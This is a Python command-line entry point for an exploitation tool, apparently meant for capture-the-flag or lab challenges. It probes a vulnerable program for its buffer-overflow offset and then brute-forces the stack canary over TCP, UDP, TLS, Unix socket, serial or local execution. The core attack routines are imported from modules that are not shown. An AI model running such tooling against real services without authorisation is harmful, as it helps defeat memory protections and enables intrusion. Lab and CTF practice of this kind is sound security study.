"""
Entry‑point for the canary‑tool package.

Usage examples
--------------
# Local binary, discover offset, brute‑force canary
python -m canary_tool.cli --exec ./vuln --auto-offset

# Remote challenge, known offset 264
python -m canary_tool.cli --tcp host:1337 --offset 264
"""

from __future__ import annotations
import argparse, sys, logging
from typing import Optional

from .target import make_target, Target
from .discover import find_offset_binary
from .canary import brute_force_canary


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="canary_tool",
        description="Brute‑force stack canaries over Unix/TCP/serial/local exec.",
    )

    # ── transport options (exactly one) ─────────────────────────────────────────
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--unix", help="Unix‑domain socket path")
    g.add_argument("--tcp", help="HOST:PORT of remote service")
    g.add_argument("--udp", help="HOST:PORT of remote service")
    g.add_argument("--tls", help="HOST:PORT of remote service")
    g.add_argument(
        "--exec",
        nargs=argparse.REMAINDER,
        help="Local binary and its arguments (use after --exec) e.g. "
        "--exec ./vuln -- -flagA 1",
    )  # note the double dash
    g.add_argument("--serial", help="/dev/ttyUSB0[:baud] serial device")

    # ── offset discovery / override ─────────────────────────────────────────────
    p.add_argument(
        "--auto-offset", action="store_true", help="Probe for offset automatically"
    )
    p.add_argument("--offset", type=int, help="Known offset (skips discovery)")

    # ── brute‑force tunables ────────────────────────────────────────────────────
    p.add_argument(
        "--canary-len", type=int, default=8, help="Bytes in canary (default 8)"
    )
    p.add_argument(
        "--pad", default="A", help="Padding byte (single char or \\xHH) before canary"
    )
    p.add_argument(
        "--prefix",
        default="",
        help="Static prefix before padding (hex with \\x‑escapes OK)",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=0.2,
        help="Seconds to wait for each probe (default 0.2)",
    )
    p.add_argument(
        "-v", "--verbose", action="count", default=0, help="‑v for INFO, ‑vv for DEBUG"
    )

    return p


def main(argv: Optional[list[str]] = None) -> None:
    args = build_parser().parse_args(argv)

    # ── logging level ──────────────────────────────────────────────────────────
    level = logging.WARNING - (10 * args.verbose)  # INFO or DEBUG
    logging.basicConfig(format="%(levelname)s: %(message)s", level=level)

    # ── build target instance ──────────────────────────────────────────────────
    tgt: Target = make_target(args)
    logging.info("Transport ready → %s", tgt)

    try:
        # ── find or trust offset ───────────────────────────────────────────────
        if args.auto_offset:
            # NB: choose a sensible max_probe; 4096 is safe for most labs
            last_safe, first_crash = find_offset_binary(
                tgt, max_probe=4096, pad=args.pad.encode("latin1"), timeout=args.timeout
            )
            offset = last_safe
            logging.info("Offset detected: %d bytes (crash at %d)", offset, first_crash)
        elif args.offset is not None:
            offset = args.offset
        else:
            sys.exit("ERROR: Either --offset or --auto-offset is required.")

        # ── brute‑force the canary ─────────────────────────────────────────────
        canary = brute_force_canary(
            tgt,
            offset=offset,
            length=args.canary_len,
            prefix=bytes(args.prefix, "latin1").decode("unicode_escape").encode(),
            pad=args.pad.encode("latin1"),
            timeout=args.timeout,
        )
        # TODO: handle None / failure cases inside brute_force_canary
        print(f"Canary → 0x{canary[::-1].hex()}" if canary else "Brute force failed")

    finally:
        tgt.close()


if __name__ == "__main__":
    main()
